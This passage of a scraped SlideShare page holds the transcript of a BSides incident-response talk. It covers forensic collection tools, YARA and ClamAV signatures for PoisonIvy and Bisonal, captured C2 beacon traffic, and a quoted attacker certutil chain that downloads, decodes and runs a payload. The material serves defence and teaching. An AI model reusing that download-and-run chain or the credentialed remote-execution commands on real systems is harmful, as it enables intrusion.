00:31:59 UTC","description":"The document discusses practical incident response in heterogeneous environments and overcoming limitations of traditional approaches. It proposes utilizing intelligence-driven investigation and actionable IOCs to more flexibly shape the triage process across different operating systems. Examples are provided of using software fingerprinting and debugging symbols to attribute malware and build structured knowledge bases of attackers.","downloadKey":"225337519442d77ac7a3291c973dca4f035dd213eb513acbd6043d2362e5e09d","editorsNotes":[],"emailShareUrl":"mailto:?subject=Check out this SlideShare presentation\u0026body=https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401","extension":"pdf","facebookShareUrl":"https://facebook.com/sharer.php?u=https%3A%2F%2Fwww.slideshare.net%2Fslideshow%2Fbsides-ir-in-heterogeneous-environment%2F97098401\u0026t=BSides+IR+in+Heterogeneous+Environment","genaiDescriptionCreatedAt":"2024-04-25","genaiTest":"description","id":"97098401","iframeEmbed":{"url":"https://www.slideshare.net/slideshow/embed_code/key/erqbbUxXGRFZAt","height":486,"width":597},"isIndexable":true,"isLikedByCurrentUser":false,"isPrivate":false,"isViewable":true,"language":"en","likes":0,"linkedinShareUrl":"https://www.linkedin.com/cws/share?url=https%3A%2F%2Fwww.slideshare.net%2Fslideshow%2Fbsides-ir-in-heterogeneous-environment%2F97098401\u0026trk=SLIDESHARE","downloadCount":12,"secretUrl":"erqbbUxXGRFZAt","shouldShowAds":true,"slides":{"host":"https://image.slidesharecdn.com","title":"BSides-IR-in-Heterogeneous-Environment","imageLocation":"bsidesfinal-180515003159","imageSizes":[{"quality":85,"width":320,"format":"jpg"},{"quality":85,"width":638,"format":"jpg"},{"quality":75,"width":2048,"format":"webp"}]},"smsShareUrl":"sms:?body=Check out this SlideShare : https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401","strippedTitle":"bsides-ir-in-heterogeneous-environment","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/bsidesfinal-180515003159-thumbnail.jpg?width=640\u0026height=640\u0026fit=bounds","title":"BSides IR in Heterogeneous Environment","totalSlides":38,"transcript":["Practical Incident Response in\nHeterogeneous Environment\nKeven Murphy \u0026 Stefano Maccaglia\n1\n ","The mass-triage problem in 2018\n• The investigation process (Triage), in any IT incident, is the key to solve the case and\nto clean all the affected systems.\n• But in heterogeneous environments, where Windows, Linux, Mac OS, and Unix\nsystems are potentially affected by the attacker, the investigation process is slowed\nby a number of technical complexities.\n First problem is related to a common platform and procedure to adopt for the triage as many\ntechnologies are capable of covering only a portion of the environment.\n Second problem, what to look for, as the triage is aimed to identify malicious artifacts and usual\ntechnologies are not providing flexibility and agility to shape the triage process.\n Third problem, the capability to search the heterogeneous environment using custom IOCs.\n Fourth problem, the possibility to pinpoint known badness which allows for easier mitigation.\n• In our approach, the IOCs play an important role both for the investigation process\nand the definition of the best way to approach the triage. We were looking to a\n“rule them all” solution aimed to overcome traditional limitations of the most\ncommon commercial solutions.\n2\n ","Traditional IOCs application\n• The traditional IR approach:\n• Context, in regard of IOCs, typically does not exists.\n• Application of IOCs to the environment is rule-based\n• Customization of IOCs are not an option in some commercial products.\n• Rule-based detection will miss changes made to the actor’s tools\n3\n ","Our idea\n• The production of code leaves traces in any binary.\n• The binary can contain debugging symbols, which give you a lot of information.\n• Often the attacker tools include the use of specific libraries or functions.\n• A lot of fingerprinting can be done with software, an this is very useful for IR\nanalyses.\n• The combined information of both can help to solve the attribution problem.\n• Helps with assessment of risks\n• Identifying end goals for known actors\n• Aid the creation of IOCs that are “actionable” and not “disposable”\n4\n ","RIFT (Retrieve Interesting Files Tool)\n● Retrieves files/directories based on regex list\n● Uses Sleuthkit to retrieve files forensically\n● Outputs files files into a directory (machine name)\n● Retrieved files are saved remote share/USB\n● Recreates the directory structure of where the file was found\n● To run:\n● Download:\nrift --verbose --savedrive [SAVEDRIVE]\nhttps://github.com/chaoticmachinery/frac_rift\n5\n ","Getfileslist.txt examples\n● “getfileslist.txt” contains a regex list of files and directories that RIFT will retrieve\n6\nntuser.dat$\nsystem32/winevt/logs/\n^/etc/\n.ssh\n ","FRAC (Forensic Response ACquisition)\n● Uses RIFT to forensically retrieve files/directories across the network\n● Recommend using PAExec or SSH/SSHPASS to connect to remote machines\n● Requires local admin rights and remote share (SMB/NFS depending on OS)\n● Supports single IP, CIDR notation, and IP range like the following examples:\n● Can be used to execute any command on remote machines\n● To run:\n–172.16.10.12\n–172.16.10.1/24\n–172.16.10.1-172.16.10.230\nfrac_v0.05 --iplist iplist.txt --cmd cmd.txt –verbose\npaexec.exe [IP] -n 4 -u [ADMINID] -p [ADMINPASS] -s cmd /C \"net use\n[SHAREDRV] /delete /yes \u0026 net use [SHAREDRV] [SHARE]\n/user:[SHAREUSERID] [SHAREPASSWD] \u0026\u0026 cd /d [SAVEDRIVE] \u0026\u0026 rift.exe --\nverbose --savedrive [SAVEDRIVE] \u0026\u0026 net use [SHAREDRV] /delete /yes\"\nsshpass -p [ADMINPASS] ssh [IP] \"mkdir [SHAREDRV];mount [MNTOPTS]\n[SRCBOX]:[SRCMNT] [SHAREDRV] ; cd [SHAREDRV]/frac_v0.05 \u0026\u0026 ./rift --\nverbose --savedrive [SAVEDRIVE] ; cd / \u0026\u0026 umount [SHAREDRV] \u0026\u0026 rmdir\n[SHAREDRV]\"\nExamples\nof\nCmd.Txt\n7\n ","FRAC (Forensic Response Acquisition): The Output\n● FRAC/RIFT creates directories with the hostname of the machine\ndrwxr-xr-x 7 root root 4096 Apr 11 19:39 machinea_04112018_19-18-58\ndrwxr-xr-x 9 root root 4096 Apr 11 20:11 machineb_04112018_15-19-02\ndrwxr-xr-x 135 root root 20480 Apr 11 19:37 etc\n-rw-r--r-- 1 root root 675539 Apr 11 19:40 getfiles.txt\ndrwxr-xr-x 3 root root 4096 Apr 11 19:37 home\ndrwxr-xr-x 3 root root 4096 Apr 11 19:37 opt\ndrwxr-xr-x 5 root root 4096 Apr 11 19:21 root\n-rw-r--r-- 1 root root 230661477 Apr 11 19:43 machineb_04112018_15-19-28_fls.out\ndrwxr-xr-x 5 root root 4096 Apr 11 19:38 usr\ndrwxr-xr-x 5 root root 4096 Apr 11 19:40 var\nGetfiles.txt\nContains the mactime information for all of the files retrieved as well as the inode\n*fls.out\nContains the fls.out (mactime) output from the Sleuthkit FLS command.\nAll of the directory structure is recreated and files are forensically copied to where\nthey existed on the drive.\n8\n ","Actionable IOCs (AIOCs)\n• The concept of “actionable” IOCs has been derived and refined from a collective set of\nIncident Response investigations, and could become a valid support of our investigative\nprocess if organized in a scientifically sound approach.\n• Utilizes procedures, analysis, and evidence for a methodical approach\n• Based on positive matches can help identify the attacker\n• It allow the creation of a structured knowledge base of attackers\n• The knowledge base allows the creation of attacker profiles\n9\n ","Malware analysis process to build AIOCs\n10\n ","Example: PoisonIvy\n• PoisonIvy, a Remote Access Tool/Trojan (RAT) often used in targeted attacks, had been\nwidely seen until around 2013.\n• Since then, the number of cases using PoisonIvy decreased, and there was no special\nvariant with expanded features seen in the wild.\n• However, recently, we identified PoisonIvy with expanded features in its communication\nfunction capable to bypass HTTP/HTTPS proxy in APT and cybercriminal attacks thanks to\nmodifications in the malware code.\nLatest PoisonIvy variants are different\n11\n ","YARA RULES\nPoisonIvy typical IOC\nrule poisonivy_1 : rat\n{\nmeta:\ndescription = \"Poison Ivy\"\nauthor = \"Jean-Philippe Teissier / @Jipe_\"\ndate = \"2013-02-01\"\nfiletype = \"memory\"\nversion = \"1.0\"\nref1 = \"https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py\nstrings:\n$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C\n6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63\n74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C }\ncondition:\n$a\n}\nrule PoisonIvy_2\n{\nmeta:\nauthor = \" Kevin Breen \u003ckevin@techanarchy.net\u003e\"\ndate = \"2014/04\"\nref = \"http://malwareconfig.com/stats/PoisonIvy\"\nmaltype = \"Remote Access Trojan\"\nfiletype = \"exe\"\nstrings:\n$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}\n$string1 = \"CONNECT %s:%i HTTP/1.0\"\n$string2 = \"ws2_32\"\n$string3 = \"cks=u\"\n$string4 = \"thj@h\"\n$string5 = \"advpack\"\ncondition:\n$stub at 0x1620 and all of ($string*) or (all of them)\n}\n} rule PoisonIvy_Generic_3 {\nmeta:\ndescription = \"PoisonIvy RAT Generic Rule\"\nauthor = \"Florian Roth\"\ndate = \"2015-05-14\"\nhash = \"e1cbdf740785f97c93a0a7a01ef2614be792afcd\"\nstrings:\n$k1 = \"Tiger324{\" fullword ascii\n$s2 = \"WININET.dll\" fullword ascii\n$s3 = \"mscoree.dll\" fullword wide\n$s4 = \"WS2_32.dll\" fullword\n$s5 = \"Explorer.exe\" fullword wide\n$s6 = \"USER32.DLL\"\n$s7 = \"CONOUT$\"\n$s8 = \"login.asp\"\n$h1 = \"HTTP/1.0\"\n$h2 = \"POST\"\n$h3 = \"login.asp\"\n$h4 = \"check.asp\"\n$h5 = \"result.asp\"\n$h6 = \"upload.asp\"\ncondition:\nuint16(0) == 0x5a4d and filesize \u003c 500KB and\n(\n$k1 or all of ($s*) or all of ($h*)\n)\nrule PoisonIvy_Sample_APT {\nmeta:\ndescription = \"Detects a PoisonIvy APT malware group\"\nauthor = \"Florian Roth\"\nreference = \"VT Analysis\"\ndate = \"2015-06-03\"\nhash = \"b874b76ff7b281c8baa80e4a71fc9be514093c70\"\nstrings:\n$s0 = \"pidll.dll\" fullword ascii\n$s1 = \"sens32.dll\" fullword wide\n$s3 = \"FileDescription\" fullword wide\n$s4 = \"OriginalFilename\" fullword\n$s5 = \"ZwSetInformationProcess\" fullword ascii\n$s9 = \"Microsoft Media Device Service Provider\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize \u003c 47KB and all of them\n} 12\n ","rule PoisonIvy {\nstrings:\n$s1 = \"%supdate%4d%02d%02d%02d%02d%02d.tmp\" wide ascii\n$s2 = \"cks=u\" wide ascii\n$s3 = “CONNECT %s:%i HTTP//1.0” wide ascii\n$s4 = “vry7fo/URLDownez{” wide ascii\n$s5 = “6u%u.193.%d” wide ascii\n$s6 = “/c del %s \u003e nul” wide ascii\n$s7 = “%u.193.%d.%d” wide ascii\n$s8 = “GET %s HTTP/1.1” wide ascii\ncondition:\n($s1 and $s2 and $s3) or ($s4 and $s5) or ($s6 and $s7 and $s8) and\n// MZ signature at offset 0 and ...\nuint16(0) == 0x5A4D and\n// ... PE signature at offset stored in MZ header at 0x3C\nuint32(uint32(0x3C)) == 0x00004550\n}\nYARA RULES\nPoisonIvy Actionable IOC: Yara rule\nThe first three strings identify the\nPoisonIvy generic variants, including\nlatest ones.\nThese strings match an old version of\nPoisonIvy 2011 packed in UPX.\nFor the same sample, we use these\nstrings to match the decompressed\nversion of PoisonIvy (always 2011).\n ","AIOCs formalization process\nAtomic\nIOCs\nHigh order Yara\nrules for files\nand packets\nActor tags and\nattack\ndescriptions\nActor tools\nHigh order\nClamAV signature\nHigh order log and\nsystem artifacts\nSystem and\nnetwork\nvisibility\nAlternative\nSystem\nvisibility\nLog and\nartifacts\nvisibility\nClassification and attribution\nVirustotal\nand other\nrepository\nsearches\nEvolutive and comparative analysis\nformalization\n14\n ","• Bisonal is another example. It is a backdoor.\n• The malware can be split into two components:\n the main module,\n communication module.\n• The main module is responsible for providing the framework to execute the various\ncomponents within the malware.\n• The communication module is responsible for the sending of information to the server,\nreceiving new commands from it and downloading of new executable.\n• If a new executable is downloaded successfully, it will notifying the main\nmodule to execute it.\n• The malware is capable of:\n• Listing and controlling processes\n• Creating and deleting files\n• Creating a remote shell\n• Downloading and executing files\n• Bisonal is an APT tool.\nTrojan.Bisonal\n15\n ","Trojan.Bisonal traffic\n• Custom “flag” and c2 domain – used to track victim\n16\nGET /j/news.asp?id=* HTTP/1.1\nUser-Agent: flag:khi host:Business IP:10.0.0.51\nOS:XPSP3 vm:.. proxy:..\nHost: online.cleansite.us\nCache-Control: no-cache\n----------------\nGET /a.asp?id=* HTTP/1.1\nAccept:*/*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0;\nWindows NT 5.1; Trident/4.0;.NET CLR 2.0.50727;\n.NET CLR 3.0.04.506.648;.NET CLR 3.5.21002)\nHost: khi.acmetoy.com\nConnection: Keep-Alive\nGET\n/rc/news1.asp?id=flag:831nec%20host:Remote%20PC%20\nIP:169.254.100.211%20OS:XPSP3%20vm:..%20proxy:..\nHTTP/1.1\nUser-Agent: flag:831nec host:Remote PC\nIP:169.254.100.211\nOS:XPSP3 vm:?? proxy:??\nHost: online.4pu.com\n----------------\nGET /a.asp?id=* HTTP/1.1\nAccept:*/*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0;\nWindows NT 5.1; Trident/4.0;.NET CLR 2.0.50727;\n.NET CLR 3.0.04.506.648;.NET CLR 3.5.21002)\nHost: necnec.dns04.com\nConnection: Keep-Alive\n ","Trojan.Bisonal resulting AIOC description\no Type of malware: Modular Trojan (single stage), mainly used for data stealing\no Capabilities: beaconing, listing and controlling processes, creating and deleting files, creating\nremote shells, downloading and executing files\no Dissemination strategy: via Dropper or email attachment\no Architecture: Client / Server using public C2s\no Type of communication: HTTP protocol (in general it uses TCP/80 and TCP/443, but port can be\ncustomized)\no Related Adversary: HeartBeat APT Group (Chinese)\no Earlier Adversary detection: November 2009 (South Korea - TrendMicro)\no Area of operation: actually limited to Asia (including Russia)\no Recorded targets: Mitsubishi Heavy Industries, NEC Corp, Nippon Steel Corp, IHI Corp, several\nMinistries in Japan and South Korea.\no Type of AIOCs developed: Yara rules for files, Yara rules for PCAPs, ClamAV rules, Snort Rule,\nRegistry and logs.\n17\n ","Bisonal Behavior\n Sample: 918a78b49397b17da48f37206fa7801b11d410ea6faa755d0aa27872c7e84c74\n set registry value\n key: HKCUSoftwareMicrosoftWindowsCurrentVersionRun value: dfea data: C:Windowstasksdfea.exe\n key: HKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: UNCAsIntranet data: 0\n key: HKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: AutoDetect data: 1\n Sample\u003e E8ff9de367c771fd9a5ae2df91b62fe57a64f528a7a80dbd9e307a7ae3e6af80\n Set registry value\n key: HKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: UNCAsIntranet data: 0\n key: HKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZoneMap value: AutoDetect data: 1\nRegistry keys IOCs\n18\n Sample: 918a78b49397b17da48f37206fa7801b11d410ea6faa755d0aa27872c7e84c74\n Create File\n C:WindowsTasksdfea.exe\n Sample: E8ff9de367c771fd9a5ae2df91b62fe57a64f528a7a80dbd9e307a7ae3e6af80\n Create File\n C:UsersAdminAppDataLocalTempchrome.exe\n C:WindowsTaskstaskeng.exe\nCreated files IOCs\n ","YARA RULES\nrule Trojan.Bisonal {\nstrings:\n$s1 = \"wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo\" wide ascii\n$s2 = \"defa\" wide ascii\n$s3 = \"love a meng\" wide ascii\n$s4 = \"HE@L-PShellE\" wide ascii\n$s5 = \"xecut\"\n$s6 = \"wkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo\" wide ascii\n$s7 = \"http://%s/%s.asp?id=%s%s%s\"\n$s8 = \"http://%s/a.asp?id=%s%s\"\n$s9 = \"c:a1.txt“\ncondition:\n($s1 and $s2) or ($s2 and $s3) or ($s4 and $5) and ($s6 and $s7 and $s8 and $s9) and\n// MZ signature at offset 0 and ...\nuint16(0) == 0x5A4D and\n// ... PE signature at offset stored in MZ header at 0x3C\nuint32(uint32(0x3C)) == 0x00004550\n}\nTrojan.Bisonal family\nthe first two strings are\ncommon to other Bisonal\nsamples, but not all.\nThe latest samples contain different\nstrings, except for $s6 string which is\nvery similar to the first string in\nconditition $s1.\nThese strings match a Bisonal sample\nthat uses a common obfuscation\ntechniques(split a word in more\nlines).\nBeyond the common string “defa” the\nsamples of bisonal present different\nstring.\n19\n "," Flag:727x\n Flag:1223\n Flag:8080\n Flag:84d\n Flag:d2\n Flag:dick\n Flag:ihi IHI Corp\n Flag:m615\n Flag:MARK 1\n Flag:nec01NEC Corp\n Flag:nsc516 Nippon Streel Corp\n Flag:qqq\n Flag:toray\n Flag:410maff Ministry of Agriculture, Forestry and\nFisheries\n Flag:712mhi Mitsubishi Heavy Industries\n ...\nYARA RULES toward AIOCs\nTrojan.Bisonal family\nrule campaignA {\nstrings:\n$s00 = \"Flag:8080\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignB {\nstrings:\n$s00 = \"Flag:84d\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignC {\nstrings:\n$s00 = \"flag:boat\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignD {\nstrings:\n$s00 = \"Flag:d2\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignE {\nstrings:\n$s00 = \"Flag:dick\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignF {\nstrings:\n$s00 = \"flag:ihi\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nrule campaignW {\nstrings:\n$s00 = \"Flag:qqq\" ascii wide nocase\ncondition:\nall of them and\nuint16(0) == 0xC3D4\n}\nTo develop AIOCs from atomic\nindicators we need to\nincorporate «actionable»\nelements that link the malware\nto a specific actor and\ncampaign...\nThis Yara can be\napplied to PCAPs\n20\n ","Why ClamAV for AIOCs?\n21\n ","22\nClam AV: Intro\n• ClamAV is an open source and free anti-virus program.\n• ClamAV runs on Windows (ClamWin), Linux, BSD, Solaris, and Mac OS X, and its\nmainly designed to scan email attachment, but it can be used as a regular anti-\nvirus.\n• ClamAV includes:\n• Features\n• Can search archives\n• Can search multiple file types\n• Multithreaded\n Clamscan\n Clamdscan/Clamd\n Freshclam\nCommand line virus scanner\nClient/Server virus scanner\ntool to update the virus definition database\n ","23\nYARA Rules, AIOCs and ClamAV\n• Yara is the swiss army knife for any low-cost triage and can be applied to many\nendpoint forensic platforms.\n• Values that work across multiple platforms\n• Text strings\n• Hex values that are in multiple versions of the binary\n• ClamAV provides combination of both worlds.\n• By empowering ClamAV with Yara rules, we are able to run massive triage on almost all type\nof system using AIOCs we have developed.\n ","Using ClamAV to Scan for Badness\nclamscan --infected --recursive --allmatch –archive\n-verbose --database ./{yara sigs}.yara {starting directory} |\ntee clamav_{date}_yara\nclamscan --infected --recursive --allmatch --archive-verbose\n--database ./{clamav sigs}.ldb {starting directory} | tee\nclamav_{date}_sigs\n24\n ","Using ClamAV: Results Custom Rules - ClamAV\n● Multiple hits on the same file helps to verify results\n/kswapd0: cpuminer_v2.3.3_64bit.UNOFFICIAL FOUND\n/kswapd0: cpuminer_generic.UNOFFICIAL FOUND\n/kswapd0: cpuminer_v2.3.3_102917_64bit.UNOFFICIAL FOUND\n/kswapd0: cpuminer_v2.3.3_102917_32bit.UNOFFICIAL FOUND\n/kswapd0!(0): cpuminer_v2.3.3_102917_32bit.UNOFFICIAL FOUND\n/minerd: minerd_cpuminer_v2.3.3_64bit.UNOFFICIAL FOUND\n/minerd: cpuminer_generic.UNOFFICIAL FOUND\n/minerd!(0): cpuminer_generic.UNOFFICIAL FOUND\n/yam: yam_cpuminer_64bit.UNOFFICIAL FOUND\n/yam!(0): yam_cpuminer_64bit.UNOFFICIAL FOUND\n/gcc: XMRig_v2.3.1.UNOFFICIAL FOUND\n/gcc!(0): XMRig_v2.3.1.UNOFFICIAL FOUND\n25\n ","Using ClamAV: Results Custom Rules - Yara\n● Multiple hits on the same file helps to verify results\nconfig.json: YARA.stratum.UNOFFICIAL FOUND\nconfig.json: YARA.monero.UNOFFICIAL FOUND\nconfig.json: YARA.monerohashcom.UNOFFICIAL FOUND\nconfig.json!(0): YARA.monerohashcom.UNOFFICIAL FOUND\noutfile: YARA.stratum.UNOFFICIAL FOUND\noutfile: YARA.cpuminer.UNOFFICIAL FOUND\noutfile!(0): YARA.cpuminer.UNOFFICIAL FOUND\nkswapd0: YARA.stratum.UNOFFICIAL FOUND\nkswapd0: YARA.cpuminer.UNOFFICIAL FOUND\nkswapd0!(0): YARA.cpuminer.UNOFFICIAL FOUND\n26\n ","Sigtool: ClamAV command line\n27\nSigtool\n(signature and database\nmanagement tool)\nSignature using the hash of\nthe PE-section of an\nexecutable\nSignature using full MD5\nhash of file\nSignature using the a hex\nfragment of a file\n ","C:Documents and SettingsuserDesktop\u003e sigtool --md5 malware.exe \u003e\u003e sigFile.hdb\nC:Documents and SettingsuserDesktop\u003etype sigFile.hdb\nB4619d8058362b38d20480c14d30c209:40500:malware.exe\nC:Documents and SettingsuserDesktop\u003e sigtool --mdb malware.exe.text.dat \u003e\u003e\nsigFile.mdb\n• To create a unique signature for an executable file we use the --md5 option of\nsigtool, and then save the output into a file with a “.hdb” extension.\n• To create a signature that will match a particular PE section (typically the sections are\nlabelled .text, .rdata, .data, .idata, etc.), use the “--mdb” option of sigtool and then save\nthe output into a “.mdb” file. The easiest way to generate MD5 based section signatures is\nto extract target PE sections into separate files.\nSigtool: Command explained\n28\n ","C:Documents and SettingsuserDesktop\u003e echo I am malware | sigtool --hex-dump\n4920616d2061206d616c77617265200d0a\nC:Documents and SettingsuserDesktop\u003e echo\ntestSig:0:*:4920616d2061206d616c77617265200d0a \u003e\u003e sigFile.ndb\n• The last method is to use Body-based signatures in an hexadecimal format.\nIt relies on extracted strings from the body of the file.\n• In the next example we create an hex dump of the string “I am malware”.\n• Next we save the signature that has the format called “Extended Signature”:\nMalwareName:TargetType:Offset:HexSignature and redirect the\noutput to a file “.ndb”.\nSigtool: Command explained\n29\n ","Generating ClamAV Signatures with IDA with CASC\n● ClamAV Signature Creator (CASC)\n● How to use it:\nhttps://github.com/Cisco-Talos/CASC/wiki\nOpen binary in IDA and select Strings Window\nRight click and select add string\n1\nSelect text2\n3\n30\n ","Generating ClamAV Signatures with IDA with CASC\n• Select signature(s) and hit “Create ClamAV Signature” button on the ClamAV Signature Creator view.\n• In the popup, find the signature and save to file\nNote: Make sure the extension is ldb\n4\n5\n31\n ","Remote ClamAV scan with Psexec\n Psexec can execute remote commands\nand so start the scan on every computer\nof a network.\n To use Psexec, the user must have rights\nto access the filesystem of the target\ncomputer.\n\u003e psexec 192.168.81.128 -u administrator -p p4ssw0rd1! \"C:Program Files (x86)ClamAV\nclamscan\" -r -d C:bioazih.ndb C:\n\u003e psexec DESTINATIONIP -u USER -p PASSWORD “REMOTE_PATH_TO_CLAMSCAN\" -r -d\nLOCAL_PATH_TO_CLAMAV_DATABASE_FILE REMOTE_PATH_TO_SCAN\nPsxec machine\nwith ClamAV DB\nScanned Host 1\nScanned Host 2\nScanned Host 3\n32\n ","Remote ClamAV scan with FRAC\n FRAC can be used to scan the network.\n It tracks those IP addresses that cannot\nbe connected so that can be feed back to\nFRAC later for scanning.\n Remember to create a share with clam\ndatabases\n Might be able to scan more 25 boxes at a\ntime. Do sensitive boxes by hand vs using\nFRAC.\nFRAC machine\nwith ClamAV DB\nScanned Host 1\nScanned Host 2\nScanned Host 3\n./frac_v0.05.pl --iplist iplist.txt --cmd cmd.txt --verbose\n33\n ","ClamAV PoisonIvy variants signature\nPoisonIvy2015:0:*:257375706461746525346425303264253032642530326425303264253032642e746d70*434f4e4e4543542025733a256920485454502f2f312e30\nPoisonIVY2011:0:*:202f632064656c202573203e206e756c*25752e3139332e25642e2564*47455420257320485454502f312e31*757564646f7362656174\nPoisonIVY2011UPX:0:*:76727937666f2f55524c446f776e657a7b*365c5c7525752e3139332e2564\nThe second part contains instead\n“CONNECT %s:%i HTTP//1.0”\nThe first Rule contains two non-successive strings divided by the symbol “*”. The first\nstring translated from hexadecimal contains the word\n“%supdate%4d%02d%02d%02d%02d%02d.tmp”.\nThis rule takes a Poison Ivy sample dated 2011 and we use 3 different\nstrings. The first is “/c del %s \u003e nul”\nThe second strings is\n“GET %s HTTP/1.1”\nThe last matches to\n“uuddosbea”\nThe third rule is the same sample\nmentioned above, but without the\npackage UPX. The first of two strings\nis “vry7fo/URLDownez{”\nThe second strings is\n“6u%u.193.%d”\n34\n ","ClamAV Bisonal - logic signature\nBISONAL;Target:1;(0\u00261\u00262)|(0\u00262\u00263)|(4\u00265)|(6\u00267\u00268);534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e;776b6\nb6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6c6f;633a5c77696e646f77735c7461736b735c646566612e6578\n65;6c6f76652061206d656e67;4845404c2d505368656c6c45;7865637574;776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306\n730702f317e6c6f;687474703a2f2f25732f25732e6173703f69643d257325732573;633a5c615c322e747874\nBISONAL;Target:1;(0\u00261\u00262)|(0\u00262\u00263)|(4\u00265)|(6\u00267\u00268)\nThis is a ClamAV “Body-based”, slightly different, from\nthe previous one. It has to be put inside a “.LDB” file\nand it is possible to use logic operators inside the rule.\nLogical operators in action within the BISONAL signature.\nNumbers are placeholders for the hex strings.\nMatch IF found: (both strings 0,1 and 2) OR (both strings\n0,2 and 3) OR (only strings 4 and 5) OR (both strings 6,7\nand 8).\n534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e =\nSOFTWAREMicrosoftWindowsCurrentVersionRun\n776b6b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6\nc6f = wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo\n633a5c77696e646f77735c7461736b735c646566612e657865 = c:windowstasksdfea.exe\n6c6f76652061206d656e67 = love a meng\n4845404c2d505368656c6c45 = HE@L-PShellE\n7865637574 = xecut\n776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306730702f317e6c6f =\nwkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo\n687474703a2f2f25732f25732e6173703f69643d257325732573 = http://%s/%s.asp?id=%s%s%s\n633a5c615c322e747874 = c:a2.txtz\n1\n2\n3\n4\n5\n6\n7\n8\n0\n35\n ","ClamAV and Forensics\n● ClamAV can help with Forensics investigations\n– Can detect badness in log files\n– Example Find:\n● Find in the section C of the modsec logs:\n●/var/log/httpd/modsec_audit.log: Win.Downloader.CertutilURLCache-6335697-0 FOUND\n●certutil -urlcache -split -f http://xx.xx.xx.xx/update.b64 update.b64\n●certutil -decode update.b64 update.exe\n●update.exe\n36\n ","• Actionable IOCs is an answer to the need of solid indicators to support the investigation, the\nattribution and the triage, of incidents generated by malicious actors.\n• The adoption of this methodology can positively impact investigation and triage, but also\nimproves knowledge of the tools and strategies adopted by the adversaries.\n• The formalization process behind it can facilitate the exchange of information and\nindicators without the risk of unintentional leakage of sensitive information and, in short,\nstrengthen the proactive and reactive capabilities of any structure.\nWhere are we heading\n ","Thanks!\n Ashley Shen, Steve Su\r\nThis is a threat hunting and campaign tracking 101 workshop Ashley Shen (Google) and Steve (FireEye) prepared for the HITCON 2020 CTI Village. In this presentation we share the threat hunting concept with some basic techniques and explain the process and guidance for campaign tracking. The presentation was only 65 mins so we couldn't covered everything. However through this talk we hope to share our experience and insight to the beginners.  ","tags":["threat hunting","campaign tracking","infosec"],"url":"https://www.slideshare.net/slideshow/hitcon-2020-cti-village-threat-hunting-and-campaign-tracking-workshoppptx/240070630","userLogin":"ChiEnAshleyShen","userName":"Chi En (Ashley) Shen","viewCount":6059},{"algorithmId":"2","displayTitle":"Inside Cybercrime Groups Harvesting Active Directory for Fun and Profit - Vit...","isSavedByCurrentUser":false,"pageCount":28,"score":0.7068,"slideshowId":"148833643","sourceName":"ss_similarity","strippedTitle":"inside-cybercrime-groups-harvesting-active-directory-for-fun-and-profit-vitali-kremez","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/2019-06-01-confidence-vk-main-190604085509-thumbnail.jpg?width=600\u0026height=600\u0026fit=bounds","description":"Vitali presents malware techniques and tricks on how to reverse engineer and analyze malware families exploiting active directory. The talk dives deeper into pseudo-source code level analysis and malware developer implementation of Lightweight Directory Access Protocol (LDAP) harvesting techniques for lateral movement and persistence across corporate environment. The talks explores three prolific malware families such as TrickBot, QakBot, and IcedID (BokBot) and their coding routine and patterns that are focused on collecting LDAP. For example, TrickBot specifically grabs credential and group policy information stored in “SYSVOL” das well as searching for corporate machines for possible sensitive machines associated with possible point-of-sale terminals on domain controller. Vitali also presents detection and mitigation methods on how to detect active directory exploitation and discusses defense mechanisms surrounding most popular active methods used in the wild by the sophisticated groups.\r\n\r\n","tags":["information security","it security","security"],"url":"https://www.slideshare.net/slideshow/inside-cybercrime-groups-harvesting-active-directory-for-fun-and-profit-vitali-kremez/148833643","userLogin":"proidea_conferences","userName":"PROIDEA","viewCount":2473},{"algorithmId":"2","displayTitle":"[CB19] Cyber Threat Landscape in Japan – Revealing Threat in the Shadow by  